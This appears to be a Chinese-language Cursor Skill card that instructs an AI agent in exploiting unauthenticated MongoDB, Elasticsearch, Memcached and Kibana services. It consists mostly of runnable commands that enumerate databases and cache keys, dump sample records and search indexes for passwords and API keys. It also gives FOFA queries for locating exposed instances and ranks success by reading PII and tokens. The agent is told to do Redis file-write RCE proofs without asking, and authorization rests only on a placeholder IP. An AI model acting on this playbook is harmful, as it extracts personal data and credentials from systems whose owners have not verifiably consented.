---
name: 中门无门
description: >-
 授权目标 MongoDB 27017 / Elasticsearch 9200 / Memcached 11211 未授权只读。
 
 Redis 走 redis_unauth_probe；禁止 flush_all/_delete 清数据。授权内读 captcha / 写文件证明直接做。
 旧名 `unauthorized-access-common-services` 已并入本卡。
---

# 中间件未授权（Cursor Skill）

## 真源

1. `传承/中门无门.md`
2. `python3 炼蛊房/middleware_unauth_probe.py --host <授权IP> --case <案卷>`
3. Redis 6379：`python3 炼蛊房/redis_unauth_probe.py --host <授权IP> --case <案卷>`

## 强制

1. host 在 scope（SSRF 打到的内网 IP 须先扩权）。
2. 先握手/列举。Redis 读 captcha、主从写文件证明授权内直接做。`flush_all` / `_delete` / 删索引先问。
3. 6379 另跑 `redis_unauth_probe.py`。
4. 9030/8030（Doris/StarRocks）切 `doris-unauth` · `doris_probe.py`。

---

## 一、指纹识别

| 服务 | 默认端口 | 快速探针 | 阳性特征 |
|------|---------|---------|---------|
| MongoDB | 27017 | `nc -zv <IP> 27017` 或 Python pymongo | 连接成功不弹密码提示 |
| Elasticsearch | 9200 | `curl -s http://<IP>:9200/` | JSON with `cluster_name` / `version` |
| Memcached | 11211 | `echo "stats" \| nc <IP> 11211` | `STAT pid xxx` 返回 |
| Redis | 6379 | 走 `redis_unauth_probe.py`（本卡不管） | - |

```bash
# FOFA 语法快速找同类暴露实例（情报参考）
# MongoDB: port="27017" && country="US"
# ES: port="9200" && title="elasticsearch"
# Memcached: port="11211" && protocol="memcache"
```

---

## 二、MongoDB 未授权（27017）

### 2.1 连接握手确认

```bash
# 方法1：nc 握手（看是否直接返回）
nc -zv <授权IP> 27017

# 方法2：mongostat 快速测连通（需安装 mongo-tools）
mongostat --host <授权IP>:27017 --rowcount 1 2>&1 | head -20

# 方法3：Python pymongo（推荐，零依赖安装）
python3 -c "
import pymongo, sys
try:
 c = pymongo.MongoClient('<授权IP>', 27017, serverSelectionTimeoutMS=5000)
 print('DBs:', c.list_database_names())
 c.close()
except Exception as e:
 print('FAIL:', e)
"
```

### 2.2 枚举数据库与集合

```bash
# 列出所有数据库
python3 -c "
import pymongo
c = pymongo.MongoClient('<授权IP>', 27017, serverSelectionTimeoutMS=5000)
for db in c.list_database_names():
 print('[DB]', db)
 try:
 d = c[db]
 for col in d.list_collection_names():
 cnt = d[col].estimated_document_count()
 print(' [COL]', col, 'docs:', cnt)
 except Exception as e:
 print(' ERR:', e)
c.close()
"

# 抽样查看敏感集合（users/payments/orders）
python3 -c "
import pymongo, json
c = pymongo.MongoClient('<授权IP>', 27017)
col = c['<dbname>']['<colname>']
for doc in col.find().limit(3):
 doc['_id'] = str(doc['_id'])
 print(json.dumps(doc, default=str, ensure_ascii=False))
c.close()
"
```

### 2.3 关键集合优先列表

```
users / user / account / member / admin / operator
payment / order / transaction / withdraw / deposit
config / setting / system_config
session / token / jwt_blacklist
```

### 2.4 工具一键跑

```bash
python3 炼蛊房/middleware_unauth_probe.py \
 --host <授权IP> --port 27017 --type mongo \
 --case <案卷> --out 案卷/<案卷>/recon/mongo/
```

---

## 三、Elasticsearch 未授权（9200）

### 3.1 基础探针

```bash
# 集群信息
curl -s http://<授权IP>:9200/ | python3 -m json.tool

# 节点信息（含 IP/版本/角色）
curl -s http://<授权IP>:9200/_nodes?pretty | python3 -m json.tool | head -60

# 集群健康
curl -s http://<授权IP>:9200/_cluster/health?pretty
```

### 3.2 枚举索引

```bash
# 列出所有索引（带文档数和大小）
curl -s "http://<授权IP>:9200/_cat/indices?v&s=docs.count:desc" | head -30

# 按名称过滤敏感索引
curl -s "http://<授权IP>:9200/_cat/indices?v" | grep -iE 'user|pay|order|account|member|log|admin'

# 获取索引 mapping（字段结构）
curl -s "http://<授权IP>:9200/<index_name>/_mapping?pretty" | python3 -m json.tool | head -80
```

### 3.3 数据抽样（只读）

```bash
# 搜索文档（取前3条）
curl -s -X GET "http://<授权IP>:9200/<index_name>/_search" \
 -H 'Content-Type: application/json' \
 -d '{"size":3,"query":{"match_all":{}}}' | python3 -m json.tool

# 按关键字搜索（电话、身份证、密码）
curl -s -X GET "http://<授权IP>:9200/_search" \
 -H 'Content-Type: application/json' \
 -d '{"size":5,"query":{"query_string":{"query":"password OR passwd OR secret OR apikey"}}}' \
 | python3 -m json.tool

# 聚合统计（不拉原始数据）
curl -s -X GET "http://<授权IP>:9200/<index_name>/_count" | python3 -m json.tool
```

### 3.4 Kibana 联动（若 5601 开放）

```bash
# Kibana 版本探测
curl -s http://<授权IP>:5601/api/status | python3 -m json.tool | head -20

# 未授权 Kibana API 列出 index patterns
curl -s "http://<授权IP>:5601/api/saved_objects/_find?type=index-pattern&per_page=20" \
 -H 'kbn-xsrf: true' | python3 -m json.tool
```

### 3.5 工具一键跑

```bash
python3 炼蛊房/middleware_unauth_probe.py \
 --host <授权IP> --port 9200 --type es \
 --case <案卷> --out 案卷/<案卷>/recon/es/
```

---

## 四、Memcached 未授权（11211）

### 4.1 基础探针

```bash
# stats 命令（查版本/连接数/命中率）
echo "stats" | nc -q 2 <授权IP> 11211

# 查看 slabs（内存分配情况）
echo "stats slabs" | nc -q 2 <授权IP> 11211

# 查看缓存 items 摘要（不拉值）
echo "stats items" | nc -q 2 <授权IP> 11211
```

### 4.2 枚举 Key 并读取（只读）

```bash
# 方法1：stats cachedump 按 slab 拉 key 列表
python3 -c "
import socket, time
s = socket.socket()
s.connect(('<授权IP>', 11211))
s.settimeout(5)

# 获取 slab IDs
s.send(b'stats items\r\n')
time.sleep(0.3)
data = s.recv(65535).decode(errors='replace')
import re
slab_ids = list(set(re.findall(r'STAT items:(\d+):', data)))
print('Slab IDs:', slab_ids[:10])

# 对每个 slab dump keys
for sid in slab_ids[:5]:
 s.send(f'stats cachedump {sid} 20\r\n'.encode())
 time.sleep(0.2)
 dump = s.recv(65535).decode(errors='replace')
 print(f'Slab {sid}:', dump[:500])

s.close()
"

# 方法2：读具体 key
echo "get <key_name>" | nc -q 2 <授权IP> 11211

# 方法3：批量 memdump（需安装 libmemcached-tools）
memdump --servers=<授权IP>:11211 2>/dev/null | head -50
```

### 4.3 工具一键跑

```bash
python3 炼蛊房/middleware_unauth_probe.py \
 --host <授权IP> --port 11211 --type memcached \
 --case <案卷> --out 案卷/<案卷>/recon/memcached/
```

---

## 五、成功口径

| 级别 | 条件 |
|------|------|
| L1 | 连接成功且无需密码（指纹/握手确认） |
| L2 | 枚举到敏感集合/索引名称和文档数量 |
| L3 | 读出含PII/凭据/Token的原始数据行 |

## 六、常见坑

- **ES 版本 ≥ 8.0**：默认启用安全性，直接 curl 返回 `missing authentication credentials` → 确认是否真无鉴权（有时 `_cat/health` 放通但 `_search` 认证）
- **MongoDB Atlas 托管**：公网 27017 通常有 IP 白名单，nc 可通但 pymongo 认证失败
- **Memcached UDP 协议**：部分实例仅开 UDP，需用 `-u` 参数探测 `nmap -sU -p 11211 <IP>`
- **SSRF 打内网中间件**：回显式 SSRF 才能读数据；盲 SSRF 只能验证端口存活
- **`_delete` / `flush_all` 先问**（清数据）。授权内写文件证明 RCE 直接做。

## 七、证据写入

```bash
# 截图+命令输出写入案卷
mkdir -p 案卷/<案卷>/recon/middleware/
# 保存原始响应
curl -s http://<授权IP>:9200/ > 案卷/<案卷>/recon/middleware/es_info.json
echo "mongodb unauth confirmed $(date)" >> 案卷/<案卷>/recon/middleware/notes.txt
```
